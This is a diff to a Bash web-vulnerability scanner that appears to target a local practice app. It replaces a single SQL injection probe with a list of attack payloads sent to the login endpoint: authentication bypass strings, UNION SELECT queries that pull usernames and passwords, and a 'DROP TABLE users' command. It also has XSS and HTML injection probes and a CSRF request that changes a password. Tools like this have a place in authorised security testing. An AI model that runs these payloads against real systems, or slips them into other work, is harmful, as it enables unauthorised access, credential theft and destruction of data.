@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Base URL of the target web app (Modify as needed)
+# Base URL of the target application (Modify as needed)
 BASE_URL="http://localhost:3000"
 
 # Function to check if target is online
@@ -14,19 +14,41 @@ function check_target() {
     fi
 }
 
-# Function to test SQL Injection
+# Function to test SQL Injection (More aggressive payloads)
 function test_sql_injection() {
     echo "[*] Testing for SQL Injection..."
-    
-    response=$(curl -s -X POST "$BASE_URL/rest/user/login" \
-        -H "Content-Type: application/json" \
-        -d '{"email": "\" OR 1=1 --", "password": "password"}')
 
-    if echo "$response" | grep -q "authentication succeeded"; then
-        echo "[+] SQL Injection vulnerability detected!"
-    else
-        echo "[-] No SQL Injection detected."
-    fi
+    SQLI_PAYLOADS=(
+        "' OR '1'='1' --"
+        "' OR 1=1 --"
+        "' OR 'a'='a' --"
+        "' UNION SELECT null, version(), null --"
+        "' UNION SELECT username, password FROM users --"
+        "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
+        "'; DROP TABLE users; --"
+    )
+
+    for PAYLOAD in "${SQLI_PAYLOADS[@]}"; do
+        response=$(curl -s -X POST "$BASE_URL/rest/user/login" \
+            -H "Content-Type: application/json" \
+            -d "{\"email\": \"$PAYLOAD\", \"password\": \"password\"}")
+
+        echo "[*] Testing payload: $PAYLOAD"
+
+        # Check if authentication succeeded
+        if echo "$response" | grep -q "authentication succeeded"; then
+            echo "[🔥] SQL Injection vulnerability detected with payload: $PAYLOAD"
+            return
+        fi
+
+        # Check if an SQL error is revealed
+        if echo "$response" | grep -iE "SQL syntax|mysql_fetch|error in your SQL|warning: mysql|Unclosed quotation mark"; then
+            echo "[🔥] SQL Error-based Injection detected with payload: $PAYLOAD"
+            return
+        fi
+    done
+
+    echo "[-] No SQL Injection detected."
 }
 
 # Function to test XSS
@@ -38,7 +60,7 @@ function test_xss() {
         --data-urlencode "comment=<script>alert('XSS')</script>")
 
     if echo "$response" | grep -q "<script>alert('XSS')</script>"; then
-        echo "[+] XSS vulnerability detected!"
+        echo "[🔥] XSS vulnerability detected!"
     else
         echo "[-] No XSS detected."
     fi
@@ -53,7 +75,7 @@ function test_csrf() {
         -d '{"new": "hacked_password", "repeat": "hacked_password"}')
 
     if echo "$response" | grep -q "success"; then
-        echo "[+] Possible CSRF vulnerability detected!"
+        echo "[🔥] Possible CSRF vulnerability detected!"
     else
         echo "[-] CSRF protection seems active."
     fi
@@ -68,7 +90,7 @@ function test_html_injection() {
         --data-urlencode "comment=<h1>Hacked!</h1>")
 
     if echo "$response" | grep -q "<h1>Hacked!</h1>"; then
-        echo "[+] HTML Injection vulnerability detected!"
+        echo "[🔥] HTML Injection vulnerability detected!"
     else
         echo "[-] No HTML Injection detected."
     fi
@@ -76,7 +98,7 @@ function test_html_injection() {
 
 # Main Function
 function main() {
-    echo "===== Starting Bash Security Scanner ====="
+    echo "===== Starting Enhanced Bash Security Scanner ====="
     
     check_target
     test_sql_injection
@@ -89,3 +111,4 @@ function main() {
 
 # Execute main function
 main
+
